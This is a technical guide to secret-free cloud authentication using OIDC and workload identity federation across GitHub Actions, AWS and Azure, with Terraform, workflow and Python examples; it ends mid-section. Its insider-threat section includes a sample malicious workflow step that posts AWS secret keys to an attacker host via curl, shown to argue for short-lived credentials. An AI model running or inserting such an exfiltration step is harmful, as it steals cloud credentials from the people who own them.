# Cloud Authentication Patterns (Zero-Secrets Architecture)

**Purpose**: Secure authentication patterns for AWS, Azure, and GitHub Actions without storing long-lived secrets.

**Key Principle**: **Never store long-lived credentials.** Use temporary, auto-expiring credentials via OIDC and Workload Identity Federation instead.

---

## Table of Contents

1. [Mental Model: Zero-Secrets Architecture](#mental-model-zero-secrets-architecture)
2. [Three Authentication Contexts](#three-authentication-contexts)
3. [Pattern 1: GitHub Actions â†’ AWS/Azure](#pattern-1-github-actions--awsazure)
4. [Pattern 2: AWS â†’ Azure (Cross-Cloud)](#pattern-2-aws--azure-cross-cloud)
5. [Pattern 3: Local Development](#pattern-3-local-development)
6. [Pattern 4: JWT Validation Only](#pattern-4-jwt-validation-only)
7. [Security Comparison](#security-comparison)
8. [Design Decision Checklist](#design-decision-checklist)

---

## Mental Model: Zero-Secrets Architecture

### The Fundamental Problem

**Traditional approach** (âŒ vulnerable):
```yaml
# Stored in GitHub Secrets or AWS Secrets Manager
AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
AZURE_CLIENT_SECRET: super_secret_value~abc123
```

**Problems with long-lived credentials**:
- Never expire (valid until manually rotated)
- Must be stored somewhere (attack surface)
- Anyone with access can exfiltrate them
- Provide permanent access if stolen
- No automatic rotation (easy to forget)

### Zero-Secrets Mental Model

**Modern approach** (âœ… secure):
```
No secrets stored â†’ Request temporary token â†’ Token auto-expires
```

**How it works**:
1. Identity provider (AWS, Azure, GitHub) vouches for your identity
2. You exchange proof of identity for temporary credentials
3. Credentials expire automatically (1 hour typical)
4. Each request gets fresh credentials

**Key insight**: There are **no secrets to steal** - only temporary tokens that expire automatically.

---

## Three Authentication Contexts

Every cloud application needs authentication in **three contexts**:

| Context | What | Example | Pattern |
|---------|------|---------|---------|
| **Production Runtime** | Application running in cloud | ECS task calling Microsoft Graph | Workload Identity Federation |
| **CI/CD Pipeline** | GitHub Actions deploying | Build â†’ Deploy to ECS | GitHub Actions OIDC |
| **Local Development** | Developer on laptop | Testing locally | `az login` or `aws sso login` |

**Critical**: Each context uses a **different authentication method**, but all share the zero-secrets principle.

---

## Pattern 1: GitHub Actions â†’ AWS/Azure

**Use case**: CI/CD pipeline deploying to AWS or Azure

### Mental Model

**âŒ Wrong**: Clone repo â†’ Get secrets â†’ Access cloud
- Anyone who clones repo gets cloud access (wrong!)

**âœ… Correct**: Push to GitHub â†’ GitHub generates OIDC token â†’ Cloud validates token â†’ Grant temporary access
- OIDC token can **only be generated by GitHub's infrastructure**
- Token claims include repo name (can't be faked)
- Cloud validates token matches configured trust policy

### AWS OIDC Implementation

**Step 1**: Configure AWS to trust GitHub (in your AWS account)

```hcl
# terraform/github-oidc-provider.tf

# One-time setup: Register GitHub as OIDC provider
resource "aws_iam_openid_connect_provider" "github" {
  url             = "https://token.actions.githubusercontent.com"
  client_id_list  = ["sts.amazonaws.com"]
  thumbprint_list = ["6938fd4d98bab03faadb97b34396831e3780aea1"]
}

# Create role that ONLY your specific repo can assume
resource "aws_iam_role" "github_actions_deployment" {
  name = "github-actions-deployment"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Principal = {
        Federated = aws_iam_openid_connect_provider.github.arn
      }
      Action = "sts:AssumeRoleWithWebIdentity"

      # ðŸ”‘ THIS IS THE CONNECTION
      # Explicitly allow ONLY your repo
      Condition = {
        StringEquals = {
          "token.actions.githubusercontent.com:sub":
            "repo:your-org/your-repo:ref:refs/heads/main"
            #     ^^^^^^^^ Your organisation
            #             ^^^^^^^^^ Your repo
            #                                   ^^^^ Your branch
        }
      }
    }]
  })
}

# Grant permissions to the role
resource "aws_iam_role_policy" "deployment_permissions" {
  role = aws_iam_role.github_actions_deployment.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = [
        "ecs:UpdateService",
        "ecr:GetAuthorizationToken",
        "ecr:BatchCheckLayerAvailability"
      ]
      Resource = "*"
    }]
  })
}
```

**Step 2**: Update GitHub workflow (no secrets!)

```yaml
# .github/workflows/deploy.yml

name: Deploy to AWS

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest

    # CRITICAL: Grant permission to request OIDC token
    permissions:
      id-token: write  # Required for OIDC
      contents: read

    steps:
      - uses: actions/checkout@v4

      # Get temporary AWS credentials (NO SECRETS!)
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deployment
          aws-region: ap-southeast-2
          # NO aws-access-key-id or aws-secret-access-key needed!

      # Use temporary credentials
      - name: Deploy to ECS
        run: aws ecs update-service --cluster my-cluster --service my-service --force-new-deployment
```

**What happens**:
1. GitHub generates OIDC token with claim `"sub": "repo:your-org/your-repo:ref:refs/heads/main"`
2. Workflow sends token to AWS STS
3. AWS validates: (a) token signature is valid, (b) `sub` claim matches trust policy
4. AWS issues temporary credentials (valid 1 hour)
5. Workflow uses credentials, they expire automatically

### Azure OIDC Implementation

**Step 1**: Configure Azure Federated Identity (in your Azure tenant)

```hcl
# terraform/azure-github-oidc.tf

resource "azuread_application" "deployment" {
  display_name = "GitHub Deployment"
}

resource "azuread_service_principal" "deployment" {
  application_id = azuread_application.deployment.application_id
}

# Federated credential for GitHub Actions
resource "azuread_application_federated_identity_credential" "github_actions" {
  application_object_id = azuread_application.deployment.object_id
  display_name          = "github-actions-deployment"

  audiences = ["api://AzureADTokenExchange"]
  issuer    = "https://token.actions.githubusercontent.com"
  subject   = "repo:your-org/your-repo:ref:refs/heads/main"
}

# Grant permissions
resource "azurerm_role_assignment" "deployment_contributor" {
  scope                = data.azurerm_subscription.current.id
  role_definition_name = "Contributor"
  principal_id         = azuread_service_principal.deployment.object_id
}
```

**Step 2**: Update GitHub workflow

```yaml
# .github/workflows/deploy-azure.yml

name: Deploy to Azure

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest

    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      # Login to Azure (NO CLIENT SECRET!)
      - name: Azure Login
        uses: azure/login@v1
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}        # Public ID (use 'vars' not 'secrets')
          tenant-id: ${{ vars.AZURE_TENANT_ID }}        # Public ID
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
          # NO client-secret parameter!

      - name: Deploy to Azure App Service
        uses: azure/webapps-deploy@v2
        with:
          app-name: my-app
          package: .
```

**Security benefit**: Even developers with repository write access can't exfiltrate secrets - there are none to steal!

---

## Pattern 2: AWS â†’ Azure (Cross-Cloud)

**Use case**: Application running on AWS ECS needs to call Azure services (Microsoft Graph, Entra ID, etc.)

### Mental Model

**âŒ Wrong**: Store Azure Client Secret in AWS Secrets Manager
- Still a secret to manage and rotate
- Anyone with Secrets Manager access can exfiltrate it

**âœ… Correct**: Use Azure Workload Identity Federation for AWS
- No Client Secret needed
- AWS IAM role identity â†’ Azure temporary token
- Token expires automatically

### Implementation

**Step 1**: Configure Azure to trust AWS IAM role

```hcl
# terraform/azure-workload-identity.tf

resource "azuread_application" "ecs_integration" {
  display_name = "ECS SharePoint Integration"
}

resource "azuread_service_principal" "ecs_integration" {
  application_id = azuread_application.ecs_integration.application_id
}

# Federated credential for AWS ECS task role
resource "azuread_application_federated_identity_credential" "aws_ecs" {
  application_object_id = azuread_application.ecs_integration.object_id
  display_name          = "aws-ecs-task-role"

  audiences = ["api://AzureADTokenExchange"]
  issuer    = "https://sts.amazonaws.com"
  subject   = "arn:aws:iam::123456789012:role/ecs-sharepoint-task-role"
  #                          ^^^^^^^^^^^^ Your AWS account
  #                                       ^^^^^^^^^^^^^^^^^^^^^^^^ Your ECS task role
}

# Grant Microsoft Graph permissions
resource "azuread_app_role_assignment" "msgraph_permissions" {
  app_role_id         = "df021288-bdef-4463-88db-98f22de89214"  # User.Read.All
  principal_object_id = azuread_service_principal.ecs_integration.object_id
  resource_object_id  = data.azuread_service_principal.msgraph.object_id
}
```

**Step 2**: Update ECS task to use DefaultAzureCredential

```python
# api/auth/azure_auth.py

from azure.identity import DefaultAzureCredential
from msgraph import GraphServiceClient
import os

class AzureAuth:
    """
    Azure authentication using Workload Identity Federation.

    NO CLIENT SECRET NEEDED!

    Works in three contexts:
    - Local dev: Uses Azure CLI credentials (from 'az login')
    - ECS production: Uses Workload Identity (AWS IAM role â†’ Azure token)
    - CI/CD: Uses managed identity or service principal
    """

    def __init__(self):
        self.tenant_id = os.environ.get("AZURE_TENANT_ID")
        self.client_id = os.environ.get("AZURE_CLIENT_ID")
        # NO AZURE_CLIENT_SECRET environment variable!

    def get_credential(self):
        """
        Get Azure credential (auto-detects environment).

        Local dev: Uses 'az login' credentials
        ECS: Uses AWS IAM role + Workload Identity
        """
        return DefaultAzureCredential()

    def get_graph_client(self):
        """Get Microsoft Graph client."""
        credential = self.get_credential()
        scopes = ['https://graph.microsoft.com/.default']
        return GraphServiceClient(credential, scopes)


# Usage
azure_auth = AzureAuth()
graph_client = azure_auth.get_graph_client()

# Call Microsoft Graph (NO CLIENT SECRET INVOLVED!)
user = await graph_client.me.get()
print(f"Authenticated as: {user.display_name}")
```

**Step 3**: Configure ECS task environment (no secrets!)

```hcl
# terraform/ecs.tf

resource "aws_ecs_task_definition" "sharepoint_pipeline" {
  family = "sharepoint-pipeline"

  container_definitions = jsonencode([{
    name  = "app"
    image = "..."

    environment = [
      {
        name  = "AZURE_TENANT_ID"
        value = "12345678-1234-1234-1234-123456789012"  # Public ID, not a secret
      },
      {
        name  = "AZURE_CLIENT_ID"
        value = "87654321-4321-4321-4321-210987654321"  # Public ID, not a secret
      }
      # NO AZURE_CLIENT_SECRET!
    ]
  }])
}
```

**How it works**:
1. ECS task starts with AWS IAM role credentials
2. Python code calls `DefaultAzureCredential()`
3. Credential library requests OIDC token from AWS STS
4. Token sent to Azure Entra ID with Client ID
5. Azure validates: token signed by AWS + subject matches federated credential
6. Azure issues temporary access token (1 hour validity)
7. App calls Microsoft Graph with Azure token

---

## Pattern 3: Local Development

**Use case**: Developer testing on their laptop

### Mental Model

**âŒ Wrong**: Share Client Secret with developers for local testing
- Secret proliferation (stored in .env files)
- Hard to audit who has access
- Difficult to rotate (must update all developers' .env files)

**âœ… Correct**: Developers use their own identity via CLI tools
- `az login` for Azure (user account)
- `aws sso login` for AWS (SSO account)
- No secrets stored locally
- Revoke access by disabling user account

### Azure Local Development

**Setup** (one-time per developer):

```bash
# Install Azure CLI
brew install azure-cli  # macOS
# OR
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash  # Linux

# Login with your Azure account
az login

# Verify authentication
az account show
```

**Code** (same code works everywhere!):

```python
# api/auth/azure_auth.py

from azure.identity import DefaultAzureCredential

# This automatically detects the environment:
# - Local dev: Uses Azure CLI credentials (from 'az login')
# - ECS: Uses Workload Identity Federation
# - No code changes needed!
credential = DefaultAzureCredential()
```

**How DefaultAzureCredential works** (tries in order):

1. Environment variables (service principal with client secret) â†’ Skipped locally
2. Workload Identity (AWS/Azure managed identity) â†’ Skipped locally
3. **Azure CLI (from `az login`) â†’ âœ… Works locally**
4. Managed Identity â†’ Skipped locally
5. Visual Studio credentials â†’ Windows only

### AWS Local Development

**Setup** (one-time per developer):

```bash
# Install AWS CLI
brew install awscli  # macOS

# Configure SSO
aws configure sso
# SSO session name: my-org
# SSO start URL: https://your-org.awsapps.com/start
# SSO region: ap-southeast-2

# Login with SSO
aws sso login --profile my-org

# Set as default profile
export AWS_PROFILE=my-org
```

**Code** (works everywhere):

```python
# api/aws/bedrock_client.py

import boto3

# boto3 automatically uses credentials from:
# - Local dev: AWS SSO credentials (from 'aws sso login')
# - ECS: IAM role credentials (from ECS task role)
bedrock = boto3.client('bedrock-runtime', region_name='ap-southeast-2')
```

### Local Dev Best Practices

| âœ… DO | âŒ DON'T |
|-------|----------|
| Use `az login` (Azure) | Store Client Secret in .env |
| Use `aws sso login` (AWS) | Share access keys between developers |
| Use each developer's personal account | Use shared "dev" service account |
| Revoke access via user management | Rotate secrets across team |
| Test with real (non-prod) environments | Mock everything and never test real integration |

### Troubleshooting Local Dev

**Issue**: "DefaultAzureCredential failed to retrieve a token"

```bash
# Check if logged in
az account show

# If not, login
az login

# If multiple subscriptions, select correct one
az account set --subscription "Subscription Name"
```

**Issue**: "AWS credentials not found"

```bash
# Check SSO session
aws sso login --profile my-org

# Verify credentials work
aws sts get-caller-identity --profile my-org

# Set default profile for session
export AWS_PROFILE=my-org
```

---

## Pattern 4: JWT Validation Only

**Use case**: API validates JWT tokens from users (doesn't call external services)

### Key Insight: No Secrets Needed!

JWT validation **only requires public keys** from the identity provider.

**âŒ Wrong**: Store Client Secret for JWT validation
```python
# DON'T DO THIS - Client Secret not needed!
AZURE_CLIENT_SECRET = os.getenv("AZURE_CLIENT_SECRET")  # Unnecessary!
```

**âœ… Correct**: Fetch public keys from identity provider

```python
# api/auth/jwt_validation.py

from jose import jwt, JWTError
import requests
from fastapi import HTTPException, Header, Depends

# These are PUBLIC identifiers, not secrets
TENANT_ID = "12345678-1234-1234-1234-123456789012"
CLIENT_ID = "87654321-4321-4321-4321-210987654321"

# Public endpoint for Azure AD public keys
JWKS_URL = f"https://login.microsoftonline.com/{TENANT_ID}/discovery/v2.0/keys"


def validate_jwt(token: str) -> dict:
    """
    Validate Azure Entra ID JWT token.

    NO CLIENT SECRET NEEDED - uses public keys from Azure AD.
    """
    # Fetch public keys from Azure AD (public endpoint, no auth needed)
    jwks = requests.get(JWKS_URL).json()

    # Decode and validate token using PUBLIC keys
    decoded = jwt.decode(
        token,
        jwks,  # Public keys from Azure AD
        algorithms=["RS256"],
        audience=CLIENT_ID,  # Validate token is for our app
        issuer=f"https://login.microsoftonline.com/{TENANT_ID}/v2.0"
    )

    return decoded


async def get_current_user(authorization: str = Header(...)) -> dict:
    """Extract and validate user from JWT (Dependency for FastAPI)."""
    try:
        # Remove "Bearer " prefix
        token = authorization.replace("Bearer ", "")

        # Validate token (NO CLIENT SECRET INVOLVED!)
        user_claims = validate_jwt(token)

        return user_claims

    except JWTError as e:
        raise HTTPException(status_code=401, detail="Invalid token")


# Usage in endpoints
@app.get("/api/v1/search")
async def search(
    query: str,
    user: dict = Depends(get_current_user)  # Automatically validates JWT
):
    """Search endpoint with JWT authentication."""
    user_id = user["sub"]
    user_email = user.get("email")

    # Perform search with user context
    results = perform_search(query, user_id=user_id)
    return results
```

**What's needed**:
- âœ… Tenant ID (public, in JWKS URL)
- âœ… Client ID (public, your API's identifier)
- âœ… Public keys (fetched from Azure AD public endpoint)
- âŒ Client Secret (NOT NEEDED!)

**Action**: If you're only validating JWTs, **delete the Client Secret** from your secrets!

---

## Security Comparison

### Long-Lived Credentials vs. Temporary Tokens

| Aspect | Long-Lived (âŒ) | Temporary (âœ…) |
|--------|-----------------|----------------|
| **Stored secrets** | Yes (GitHub Secrets, Secrets Manager) | **None** |
| **Exfiltration risk** | High (anyone with access can steal) | **None (no secrets to steal)** |
| **Expiration** | Never (manual rotation) | **Auto-expire (1 hour)** |
| **Compromise impact** | Permanent access until rotated | **1 hour max** |
| **Scope** | Broad (any workflow/code can use) | **Granular (specific repo/branch/role)** |
| **Rotation burden** | Manual (easy to forget) | **Automatic** |
| **Audit trail** | "User X did Y" | **"Repo X workflow Y did Z"** |

### Insider Threat Scenario

**Most realistic threat**: Developer with repository write access exfiltrates secrets.

**With long-lived credentials**:
```yaml
# Malicious workflow
- name: Steal secrets
  run: |
    curl -X POST https://attacker.com/collect \
      -d "key=${{ secrets.AWS_ACCESS_KEY_ID }}" \
      -d "secret=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
```

**Result**: âœ… **Attack succeeds** - Attacker has permanent AWS access

**With OIDC**:
```yaml
# Workflow file only contains public role ARN
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::123456789012:role/deploy  # PUBLIC information
```

**Result**: âš ï¸ **Attack has limited impact**:
- No secrets in workflow file to steal
- If attacker runs malicious workflow, gets temporary credentials (1 hour validity)
- CloudTrail audit trail shows exactly which repo/workflow got access
- Credentials expire automatically

**Additional protection**: Restrict role to protected branches:
```hcl
Condition = {
  StringEquals = {
    "token.actions.githubusercontent.com:sub":
      "repo:your-org/your-repo:ref:refs/heads/main"  # Only main branch
  }
}
```

Now attacker must merge to `main` (requires PR approval), not just push to any branch.

---

## Design Decision Checklist

When designing a new cloud integration, use this checklist:

### 1. Authentication Context

**Question**: Where will this code run?

- [ ] GitHub Actions (CI/CD)
  - â†’ Use GitHub Actions OIDC (Pattern 1)
- [ ] AWS ECS/Lambda/EC2
  - â†’ If calling AWS services: Use IAM role (built-in)
  - â†’ If calling Azure services: Use Workload Identity Federation (Pattern 2)
- [ ] Local development
  - â†’ Use `az login` or `aws sso login` (Pattern 3)
- [ ] API validating JWTs
  - â†’ Use public keys, no secrets (Pattern 4)

### 2. What Secrets Exist?

**Question**: What credentials are currently stored?

- [ ] `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` in GitHub Secrets?
  - â†’ Migrate to GitHub Actions OIDC
- [ ] `AZURE_CLIENT_SECRET` in GitHub Secrets or Secrets Manager?
  - â†’ Check if used for:
    - JWT validation? â†’ Delete it (use public keys)
    - Calling Azure APIs from AWS? â†’ Migrate to Workload Identity
    - GitHub Actions deployment? â†’ Migrate to OIDC
- [ ] Long-lived tokens/keys in environment variables?
  - â†’ Replace with credential chain (DefaultAzureCredential, boto3 default)

### 3. Configuration Changes

**Question**: What needs to be configured?

**For OIDC (GitHub â†’ AWS/Azure)**:
- [ ] Register OIDC provider in cloud (one-time per account)
- [ ] Create IAM role / Service Principal with federated credential
- [ ] Configure trust policy with exact repo/branch
- [ ] Update workflow: add `permissions.id-token: write`
- [ ] Remove client secret / access keys from GitHub Secrets
- [ ] Move Client ID / Tenant ID from `secrets` to `vars` (they're public)

**For Workload Identity (AWS â†’ Azure)**:
- [ ] Create Azure App Registration
- [ ] Configure federated credential with AWS IAM role ARN as subject
- [ ] Grant Microsoft Graph / Azure API permissions
- [ ] Update code to use `DefaultAzureCredential()`
- [ ] Remove `AZURE_CLIENT_SECRET` from environment variables
- [ ] Keep `AZURE_TENANT_ID` and `AZURE_CLIENT_ID` (public IDs)

**For Local Development**:
- [ ] Document setup: `az login` or `aws sso login`
- [ ] Update README with local dev authentication instructions
- [ ] Remove shared service account credentials from .env.example
- [ ] Update code to use credential chains (works everywhere)

### 4. Security Review

**Questions to ask**:

- [ ] Are we storing any long-lived secrets? (should be NO)
- [ ] Can developers with repo write access exfiltrate secrets? (should be NO)
- [ ] Do credentials expire automatically? (should be YES)
- [ ] Is access scoped to specific repo/branch/role? (should be YES)
- [ ] Do we have audit trail showing which workflow/role did what? (should be YES)
- [ ] What happens if credentials are compromised? (should be: expire in 1 hour)

### 5. Migration Plan

**If migrating from long-lived to temporary credentials**:

- [ ] Phase 1: Set up new authentication (OIDC/Workload Identity)
  - Configure cloud trust policies
  - Create roles / service principals
  - Test with new credentials
- [ ] Phase 2: Update code
  - Add `permissions.id-token: write` to workflows
  - Replace `ClientSecretCredential` with `DefaultAzureCredential`
  - Update environment variables (remove secrets)
- [ ] Phase 3: Verify and clean up
  - Test all authentication flows
  - Verify audit logs show new authentication
  - Delete old secrets from GitHub/Secrets Manager
  - Delete Client Secrets from Azure App Registrations
  - Revoke old access keys from AWS IAM users

### 6. Documentation Updates

- [ ] Update README with authentication setup instructions
  - GitHub Actions OIDC configuration
  - Local development setup (`az login` / `aws sso login`)
  - Environment variables (which are still needed, which removed)
- [ ] Create/update ADR for authentication architecture
  - Why OIDC/Workload Identity chosen
  - Security benefits
  - Migration plan
- [ ] Update .env.example
  - Remove secrets (Client Secret, Access Keys)
  - Keep public IDs (Client ID, Tenant ID)
  - Add comments explaining authentication

---

## Handling Long-Running Jobs

### Understanding Credential Behavior

**CRITICAL DISTINCTION**: Not all credentials have session limits!

**ECS Task Roles** (NO session limit):
- âœ… Credentials auto-refresh **indefinitely** via ECS metadata endpoint
- boto3 requests new credentials every ~45 minutes automatically
- DefaultAzureCredential uses boto3's credentials, so also refreshes indefinitely
- **Your sync can run for days** - credentials keep refreshing!
- No need to exit and restart for credential expiration

**AssumeRole Sessions** (12-hour maximum):
- âŒ GitHub Actions OIDC â†’ AWS role: 12-hour maximum session duration
- Used in CI/CD pipelines, not long-running jobs
- If you need longer than 12 hours, don't use AssumeRole - use ECS task roles instead

**Real-world scenario (ECS task role)**:
```
SharePoint initial sync starts Monday 10:00 AM
â”œâ”€ Credentials auto-refresh: 10:45 AM, 11:30 AM, 12:15 PM, 1:00 PM...
â”œâ”€ Job still running Tuesday 2:00 PM (28 hours elapsed)
â””â”€ âœ… SUCCESS: Credentials refreshed automatically throughout
```

### Why Checkpointing is Still Valuable

Even though ECS credentials don't expire, checkpointing is critical for:

1. **Task failures** - Network issues, out of memory, application bugs
2. **Deployments** - Running tasks terminated when deploying new version
3. **Cost optimization** - Fargate Spot interruptions (70% cheaper, but can be interrupted)
4. **Observability** - Track progress, estimate time remaining

**Pattern**: Process in chunks, save progress, resume on failure.

**Architecture**:
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Job processing (credentials auto-refresh)          â”‚
â”‚                                                      â”‚
â”‚ 1. Process chunk 1 â†’ Checkpoint                    â”‚
â”‚ 2. Process chunk 2 â†’ Checkpoint                    â”‚
â”‚ 3. Process chunk 3 â†’ Checkpoint                    â”‚
â”‚ 4. âŒ INTERRUPTION (deployment, failure, Spot)     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                     â”‚
                     â”‚ ECS task restarts
                     â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Job resumes from checkpoint                        â”‚
â”‚                                                      â”‚
â”‚ 1. Load checkpoint â†’ Process chunk 4 â†’ Checkpoint  â”‚
â”‚ 2. Process chunk 5 â†’ Checkpoint                     â”‚
â”‚ 3. ... continues until complete                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Implementation Example: SharePoint Sync with Checkpointing

```python
# pipeline/worker/sharepoint_sync.py

import asyncio
import json
import time
from datetime import datetime, timedelta
from pathlib import Path
from azure.identity import DefaultAzureCredential
from msgraph import GraphServiceClient
import boto3

class SharePointSyncWorker:
    """
    Long-running SharePoint sync with checkpointing.

    IMPORTANT: ECS task role credentials auto-refresh indefinitely!
    - boto3 and DefaultAzureCredential auto-refresh every ~45 minutes
    - No need to exit for credential expiration
    - Checkpointing is for: failures, deployments, Spot interruptions, observability

    How it works:
    1. Processing in chunks (batches of documents)
    2. Saving progress after each chunk
    3. Resuming from checkpoint on task restart
    """

    def __init__(self):
        # ECS task role - credentials auto-refresh indefinitely
        self.credential = DefaultAzureCredential()
        self.graph_client = GraphServiceClient(
            self.credential,
            scopes=['https://graph.microsoft.com/.default']
        )

        # boto3 auto-refreshes ECS credentials every ~45 minutes
        self.s3_client = boto3.client('s3')
        self.dynamodb = boto3.resource('dynamodb')
        self.checkpoint_table = self.dynamodb.Table('sharepoint-sync-checkpoints')

    async def sync_sharepoint_site(self, site_id: str):
        """
        Sync SharePoint site with checkpointing and resume.

        If interrupted (by failure, deployment, Spot interruption), resumes from checkpoint.
        Credentials auto-refresh indefinitely - no need to exit for credential expiration.
        """
        # Load checkpoint (if exists)
        checkpoint = self.load_checkpoint(site_id)

        if checkpoint:
            print(f"ðŸ“ Resuming from checkpoint: {checkpoint['last_processed_item']}")
            start_token = checkpoint.get('continuation_token')
        else:
            print(f"ðŸ†• Starting fresh sync for site: {site_id}")
            start_token = None

        # Get drive items (paginated)
        continuation_token = start_token
        total_processed = checkpoint.get('total_processed', 0) if checkpoint else 0

        while True:
            # Process batch of documents
            try:
                # Get next page of items
                result = await self.get_drive_items_page(site_id, continuation_token)

                items = result.get('value', [])
                continuation_token = result.get('@odata.nextLink')

                if not items:
                    # No more items, sync complete!
                    self.save_checkpoint(site_id, {
                        'status': 'completed',
                        'total_processed': total_processed,
                        'completed_at': datetime.utcnow().isoformat()
                    })
                    print(f"âœ… Sync complete! Processed {total_processed} items total.")
                    break

                # Process chunk (batch of items)
                for item in items:
                    await self.process_document(site_id, item)
                    last_item_id = item['id']
                    total_processed += 1

                # Save checkpoint after each batch
                self.save_checkpoint(site_id, {
                    'continuation_token': continuation_token,
                    'total_processed': total_processed,
                    'last_processed_item': last_item_id,
                    'status': 'in_progress',
                    'last_updated': datetime.utcnow().isoformat()
                })

                print(f"Processed batch: {len(items)} items (total: {total_processed})")

                # No more pages
                if not continuation_token:
                    self.save_checkpoint(site_id, {
                        'status': 'completed',
                        'total_processed': total_processed,
                        'completed_at': datetime.utcnow().isoformat()
                    })
                    print(f"âœ… Sync complete! Processed {total_processed} items total.")
                    break

            except Exception as e:
                print(f"âŒ Error processing batch: {e}")
                # Save checkpoint before raising
                self.save_checkpoint(site_id, {
                    'continuation_token': continuation_token,
                    'total_processed': total_processed,
                    'last_error': str(e),
                    'status': 'error',
                    'last_updated': datetime.utcnow().isoformat()
                })
                raise

    async def get_drive_items_page(self, site_id: str, continuation_token: str = None):
        """Get one page of drive items (with pagination)."""
        if continuation_token:
            # Use continuation token for next page
            response = await self.graph_client.sites[site_id].drive.items.get(
                url=continuation_token
            )
        else:
            # First page
            response = await self.graph_client.sites[site_id].drive.items.get()

        return response

    async def process_document(self, site_id: str, item: dict):
        """Process single SharePoint document (download, transform, upload to S3)."""
        # Download from SharePoint
        file_content = await self.download_document(site_id, item['id'])

        # Transform (e.g., extract text, generate embeddings)
        processed_content = self.transform_document(file_content)

        # Upload to S3
        s3_key = f"sharepoint/{site_id}/{item['id']}"
        self.s3_client.put_object(
            Bucket='content-store',
            Key=s3_key,
            Body=processed_content
        )

        # Store metadata in DynamoDB
        self.store_metadata(site_id, item, s3_key)

    def load_checkpoint(self, site_id: str) -> dict:
        """Load checkpoint from DynamoDB."""
        try:
            response = self.checkpoint_table.get_item(Key={'site_id': site_id})
            return response.get('Item')
        except Exception as e:
            print(f"No checkpoint found for site {site_id}: {e}")
            return None

    def save_checkpoint(self, site_id: str, checkpoint_data: dict):
        """Save checkpoint to DynamoDB."""
        self.checkpoint_table.put_item(
            Item={
                'site_id': site_id,
                **checkpoint_data
            }
        )


# ECS task runner
async def main():
    """
    ECS task entrypoint.

    Runs sync job with automatic resume if interrupted (failure, deployment, Spot).
    Credentials auto-refresh indefinitely - can run for days if needed.
    """
    worker = SharePointSyncWorker()

    site_id = "your-sharepoint-site-id"

    # Run sync (credentials auto-refresh throughout)
    await worker.sync_sharepoint_site(site_id)


if __name__ == "__main__":
    asyncio.run(main())
```

### ECS Configuration

**Terraform: ECS task with checkpointing**:

```hcl
# terraform/ecs-sharepoint-sync.tf

resource "aws_ecs_task_definition" "sharepoint_sync" {
  family = "sharepoint-sync"

  task_role_arn      = aws_iam_role.sharepoint_sync_task.arn  # Auto-refreshes indefinitely
  execution_role_arn = aws_iam_role.ecs_execution.arn

  container_definitions = jsonencode([{
    name  = "sync-worker"
    image = "..."

    environment = [
      { name = "AZURE_TENANT_ID", value = "..." },
      { name = "AZURE_CLIENT_ID", value = "..." }
    ]

    logConfiguration = {
      logDriver = "awslogs"
      options = {
        "awslogs-group"  = "/ecs/sharepoint-sync"
        "awslogs-region" = "ap-southeast-2"
      }
    }
  }])
}

# Optional: Scheduled incremental sync (using Delta API)
resource "aws_cloudwatch_event_rule" "sharepoint_sync_schedule" {
  name                = "sharepoint-sync-schedule"
  description         = "Run incremental SharePoint sync daily"
  schedule_expression = "rate(1 day)"
}

resource "aws_cloudwatch_event_target" "sharepoint_sync_target" {
  rule      = aws_cloudwatch_event_rule.sharepoint_sync_schedule.name
  target_id = "SharePointSyncTask"
  arn       = aws_ecs_cluster.main.arn
  role_arn  = aws_iam_role.events_ecs.arn

  ecs_target {
    task_definition_arn = aws_ecs_task_definition.sharepoint_sync.arn
    task_count          = 1
    launch_type         = "FARGATE"
  }
}
```

**How it works**:
1. **Credentials**: Task role credentials auto-refresh indefinitely (no time limit)
2. **Checkpointing**: Saves progress after each batch (resilience against failures/deployments)
3. **Initial sync**: May take hours/days to complete - credentials keep refreshing automatically
4. **Scheduled runs**: Optional incremental syncs using Delta API (gets only changes since last sync)
5. **Interruptions**: If task interrupted (deployment, failure, Spot), resumes from checkpoint on next run

### Alternative: Step Functions with Chunked Execution

For very long jobs, use AWS Step Functions to orchestrate:

```json
{
